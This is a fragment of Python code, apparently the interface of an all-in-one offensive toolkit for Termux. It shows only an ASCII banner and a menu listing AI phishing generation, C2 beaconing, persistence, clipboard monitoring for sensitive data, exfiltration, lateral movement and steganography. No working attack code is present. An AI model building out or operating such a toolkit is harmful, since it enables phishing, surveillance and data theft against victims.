...
class App:
    ...
    def _header(self) -> Text:
        ...
        t.append("║   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║  ║\n",style="bold magenta")
        t.append("║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝  ║\n",style="bold magenta")
        t.append(f"║                    v{VERSION} — ONE FILE TO RULE THEM ALL               ║\n",style="cyan")
    ...
    def _menu(self) -> Table:
        ...
        m.add_column("K",style="cyan"); m.add_column("Option",style="white"); m.add_column("Desc",style="dim")
        m.add_row("[1]","🎭 Phishing","Generate AI phishing content")
        m.add_row("[2]","🌐 C2 Ops","Beacon, server, commands")
        m.add_row("[3]","📱 Persistence","Auto-start mechanisms")
        m.add_row("[4]","🔓 Clipboard","Monitor for sensitive data")
        m.add_row("[5]","🕵️ Recon","Device & network scan")
        m.add_row("[6]","🧠 Auto Mode","AI decision engine")
        m.add_row("[7]","📤 Exfiltrate","Send data via C2")
        m.add_row("[8]","🔄 Lateral Move","Port scan & pivot")
        m.add_row("[9]","🖼️ Stego","Hide data in images")
        m.add_row("[S]","📸 Screenshot","Capture screen")
        m.add_row("[P]","🔌 Plugins","Run loaded plugins")
        m.add_row("[U]","⬆️ Update","Check for updates")
        m.add_row("[C]","⚙️ Config","Edit settings")
        m.add_row("[A]","🚀 Termux Setup","Install environment")
        m.add_row("[0]","❌ Exit","Shutdown")
        return m
